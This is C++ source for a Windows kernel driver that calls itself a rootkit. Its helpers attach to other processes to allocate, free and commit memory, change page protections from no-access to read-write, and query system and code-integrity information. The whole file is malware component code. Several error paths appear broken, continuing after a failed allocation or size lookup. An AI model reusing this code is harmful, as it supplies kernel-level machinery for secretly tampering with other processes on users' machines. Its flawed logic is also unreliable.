#include "helpers.h"
#pragma warning(disable:4996)


// general namespace:
BOOL general::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize) {
	KAPC_STATE DstState = { 0 };
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	MEMORY_BASIC_INFORMATION mbi = { 0 };

	// Query the memory area to get newer status update -
	KeStackAttachProcess(EpDst, &DstState);  // attach to destination process

	status = ZwQueryVirtualMemory(ZwCurrentProcess(), BufferAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD FAILED - CANNOT GET A RECENT MEMORY QUERY TO VERIFY STATE\n");
		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		return FALSE;
	}

	if (mbi.AllocationBase == BufferAddress) {
		switch (mbi.State) {
		case MEM_COMMIT:
			// Range is committed -

			if (!(OldState & MEM_RESERVE)) {
				status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
			}
			else {
				status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_DECOMMIT);  // de-commit the unused memory
			}
			KeUnstackDetachProcess(&DstState);  // detach from the destination process

			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD FAILED - CANNOT FREE UNUSED MEMORY/DECOMMIT RESERVED MEMORY (NOW IS COMMITTED)\n");
				return FALSE;
			}
			return TRUE;

		case MEM_RESERVE:
			// Range is reserved -

			if (!(OldState & MEM_RESERVE)) {
				status = ZwFreeVirtualMemory(ZwCurrentProcess(), &BufferAddress, &BufferSize, MEM_RELEASE);  // Release the unused memory
			}
			KeUnstackDetachProcess(&DstState);  // detach from the destination process

			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD FAILED - CANNOT FREE UNUSED MEMORY (NOW IS RESERVED)\n");
				return FALSE;
			}
			return TRUE;

		default:
			// Range is free -

			KeUnstackDetachProcess(&DstState);  // detach from the destination process
			DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD SUCCEEDED - NOW IS FREED, NOTHING TO BE DONE\n");
			return TRUE;
		}
	}
	else {
		// Range is allocated in memory but not by me -

		KeUnstackDetachProcess(&DstState);  // detach from the destination process
		DbgPrintEx(0, 0, "KMDFdriver FreeAllocatedMemoryADD SUCCEEDED - CURRENT ALLOCATION != MINE, NOTHING TO BE DONE\n");
		return TRUE;
	}
}




PVOID general::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits) {
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	PVOID AllocationAddress = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	BOOL ProtChanged = FALSE;

	// Initial query of memory (to confirm state and other parameters) -
	__try {
		ProbeForRead(InitialAddress, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);

		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(CurrState);  // detach from the process
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE\n");
			return NULL;
		}
	}

	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(CurrState);  // detach from the process
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY\n");
		return NULL;
	}


	// Notify on initial memory status -
	if (mbi.Protect & PAGE_NOACCESS) {
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS INITIALLY PAGE_NOACCESS PROTECTED\n");
		ProtChanged = ChangeProtectionSettingsADD(ZwCurrentProcess(), InitialAddress, (ULONG)AllocSize, PAGE_READWRITE, mbi.Protect);
		if (ProtChanged) {
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE SUCCESSFULLY CHANGED FROM PAGE_NOACCESS PROTECTED TO PAGE_READWRITE PROTECTED\n");
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - COULD NOT CHANGE PROTECTION FROM PAGE_NOACCESS PROTECTED (WILL PROB GIVE OUT ANOTHER MEMREGION)\n");
		}
	}

	// Set the initial allocation base for each memory state -
	if (mbi.State & MEM_FREE) {
		// Range is free -
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS CURRENTLY FREE\n");
		AllocationAddress = InitialAddress;
	}

	else if (mbi.State & MEM_RESERVE) {
		// Range is already reserved -
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS CURRENTLY RESERVED\n");
		AllocationAddress = mbi.AllocationBase;

		// Verify region size -
		if (AllocSize > mbi.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - REQUESTED MEMORY SIZE (%zu) > AVAILABLE REGION (%zu), TRYING TO RELEASE AND REQUERY..\n", AllocSize, mbi.RegionSize);
			status = ZwFreeVirtualMemory(ZwCurrentProcess(), &mbi.AllocationBase, &mbi.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(CurrState);  // detach from the process
				DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT FREE ALREADY RESERVED UNMATCHING MEMORY\n");
				return NULL;
			}

			status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(CurrState);  // detach from the process
				DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE AFTER RELEASING ALREADY RESERVED UNMATCHING MEMORY\n");
				return NULL;
			}

			AllocationAddress = InitialAddress;
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - FREED ALREADY RESERVED UNMATCHING MEMORY\n");
		}
	}

	else {
		// Range is already committed -
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - MEMORY RANGE IS CURRENTLY COMMITTED, TRYING TO FREE EXISTING COMMITTING..\n");
		status = ZwFreeVirtualMemory(ZwCurrentProcess(), &mbi.AllocationBase, &mbi.RegionSize, MEM_RELEASE);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(CurrState);  // detach from the process
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT FREE ALREADY COMMITTED MEMORY\n");
			return NULL;
		}

		status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(CurrState);  // detach from the process
			DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE AFTER RELEASING ALREADY COMMITTED MEMORY\n");
			return NULL;
		}

		AllocationAddress = InitialAddress;
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - FREED ALREADY COMMITTED MEMORY\n");
	}
	DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD UPDATE - ALIGNED INITIAL ADDRESS FROM %p TO %p\n", InitialAddress, AllocationAddress);


	// Verify region size -
	if (AllocSize > mbi.RegionSize) {
		KeUnstackDetachProcess(CurrState);  // detach from the process
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - REQUESTED MEMORY SIZE (%zu) > AVAILABLE REGION (%zu)\n", AllocSize, mbi.RegionSize);
		return NULL;
	}


	// Allocate the actual memory -
	AllocationAddress = CommitMemoryRegionsADD(ZwCurrentProcess(), AllocationAddress, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
	KeUnstackDetachProcess(CurrState);  // detach from the process
	if (AllocationAddress == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD FAILED - COMMITTING FAILED\n");
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver AllocateMemoryADD SUCCESS (RANGE ALLIGNED TO %p)\n", AllocationAddress);
	}
	return AllocationAddress;
}




ULONG64 general::GetHighestUserModeAddrADD() {
	UNICODE_STRING MaxUserSym;
	RtlInitUnicodeString(&MaxUserSym, L"MmHighestUserAddress");
	return (ULONG64)MmGetSystemRoutineAddress(&MaxUserSym);
}




NTSTATUS general::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
	if (From != NULL) {
		ObDereferenceObject(From);
	}

	if (To != NULL) {
		ObDereferenceObject(To);
	}
	RootkInst->StatusCode = StatusCode;
	RootkInst->Status = Status;
	return Status;
}




// reuests namespace:
RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PVOID Buffer = NULL;
	ULONG BufferSize = 0;
	ULONG ReceivedSize = 0;
	SIZE_T DefaultSize = 0;
	RKSYSTEM_INFORET SysInfoRet = { 0 };
	DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u (INFOTYPE = %llu)\n", SysInfNum, (ULONG64)InfoType);

	status = ZwQuerySystemInformation(InfoType, Buffer, 0, &BufferSize);  // this call will return the needed size into BufferSize
	if (BufferSize == 0) {
		DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u UPDATE - CANNOT GET INITIAL BUFFER SIZE WITH CALL WHEN SIZE=0, TRYING DEFAULT VALUES..\n", SysInfNum);
		DefaultSize = GetExpectedInfoSizeADD(InfoType);  // If possible, try to predict the size needed for the buffer and use that as a last resort
		if (DefaultSize == 0) {
			DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - DEFAULT VALUES ARE NOT AVAILABLE/CANNOT BE ACHIEVED AFTER INITIAL SIZE=0 ERROR\n", SysInfNum);
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		Buffer = ExAllocatePoolWithTag(NonPagedPool, DefaultSize, (ULONG)Flag);  // Allocate system information singular buffer
		if (Buffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - COULD NOT ALLOCATE MEMORY FOR INITIAL BUFFER WITH DEFAULT SIZE (%zu) :(\n", SysInfNum, DefaultSize);
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		else {
			// Query with the predicted value for the buffer size -
			if (!NT_SUCCESS(ZwQuerySystemInformation(InfoType, Buffer, (ULONG)DefaultSize, &ReceivedSize)) || ReceivedSize != (ULONG)DefaultSize) {
				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - QUERY FOR SYSTEM INFORMATION FAILED WITH DEFAULT SIZE (%zu) :(\n", SysInfNum, DefaultSize);
				ExFreePool(Buffer);
				SysInfoRet.Buffer = NULL;
				SysInfoRet.BufferSize = 0;
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u SUCCESS - QUERY FOR SYSTEM INFORMATION SUCCESS WITH DEFAULT SIZE (%zu) :(\n", SysInfNum, DefaultSize);
				SysInfoRet.Buffer = Buffer;
				SysInfoRet.BufferSize = DefaultSize;
			}
		}
	}
	else {
		// Allocate an inital buffer -
		Buffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, (ULONG)Flag);
		if (Buffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - COULD NOT ALLOCATE MEMORY FOR INITIAL BUFFER :(\n", SysInfNum);
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = 0;
		}
		else {
			// Query the required buffer size -
			status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, &ReceivedSize);
			if (NT_SUCCESS(status)) {
				if (ReceivedSize != BufferSize) {
					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u UPDATE - INFORMATION BUFFER SIZE UPDATED FROM INITAL %u TO %u (POOLBUFFER=%p)\n", SysInfNum, BufferSize, ReceivedSize, Buffer);
					BufferSize = ReceivedSize;
				}
				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u SUCCESS - SUCCEEDED FIRST TRY (BUFFERSIZE=%u, POOLBUFFER=%p, RECEIVEDSIZE=%u)\n", SysInfNum, BufferSize, Buffer, ReceivedSize);
				SysInfoRet.BufferSize = BufferSize;
				SysInfoRet.Buffer = Buffer;
			}
			else if (status == STATUS_INFO_LENGTH_MISMATCH) {
				DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u INITIAL FAIL - LENGTH MISMATCH (BUFFERSIZE=%u, RECEIVEDSIZE=%u), TRYING AGAIN..\n", SysInfNum, BufferSize, ReceivedSize);
				ExFreePool(Buffer);
				Buffer = ExAllocatePoolWithTag(NonPagedPool, ReceivedSize, (ULONG)Flag);
				if (Buffer == NULL) {
					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - COULD NOT ALLOCATE MEMORY FOR SECONDARY BUFFER (INITBUFFERSIZE=%u, SECBUFFERSIZE=%u) :(\n", SysInfNum, BufferSize, ReceivedSize);
					SysInfoRet.Buffer = NULL;
					SysInfoRet.BufferSize = 0;
				}

				// Query the required buffer size again -
				status = ZwQuerySystemInformation(InfoType, Buffer, ReceivedSize, NULL);
				if (NT_SUCCESS(status)) {
					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u SUCCESS - SUCCEEDED AFTER INITIAL MISMATCH (POOLBUFFER=%p, RECEIVEDSIZE(BUFFERSIZE)=%lu)\n", SysInfNum, Buffer, ReceivedSize);
					SysInfoRet.BufferSize = ReceivedSize;
					SysInfoRet.Buffer = Buffer;
				}
				else {
					DbgPrintEx(0, 0, "KMDFdriver RequestSystemInfoADD REQUEST NUMBER %u FAILED - FAILED AFTER INITIAL MISMATCH\n", SysInfNum);
					SysInfoRet.BufferSize = 0;
					SysInfoRet.Buffer = NULL;
					if (Buffer != NULL) {
						ExFreePool(Buffer);
					}
				}
			}
		}
	}
	return SysInfoRet;
}




SIZE_T requests::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
	SYSTEM_BASIC_INFORMATION sbi = { 0 };
	if (!NT_SUCCESS(ZwQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), NULL))) {
		return 0;
	}

	switch (InfoType) {
	case SystemBasicInformation: return sizeof(SYSTEM_BASIC_INFORMATION);
	case SystemPerformanceInformation: return sizeof(SYSTEM_PERFORMANCE_INFORMATION);
	case SystemRegistryQuotaInformation: return sizeof(SYSTEM_REGISTRY_QUOTA_INFORMATION);
	case SystemTimeOfDayInformation: return sizeof(SYSTEM_TIMEOFDAY_INFORMATION);
	case SystemProcessorPerformanceInformation: return sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION) * sbi.NumberOfProcessors;
	case SystemInterruptInformation: return sizeof(SYSTEM_INTERRUPT_INFORMATION) * sbi.NumberOfProcessors;
	case SystemExceptionInformation: return sizeof(SYSTEM_EXCEPTION_INFORMATION);
	case SystemModuleInformation: return sizeof(RTL_PROCESS_MODULES);
	case SystemCodeIntegrityInformation: return sizeof(SYSTEM_CODEINTEGRITY_INFORMATION);
	case SystemPolicyInformation: return sizeof(SYSTEM_POLICY_INFORMATION);
	case SystemProcessInformation: return 0;
	case SystemLookasideInformation: return 0;
	default: return 0;
	}
}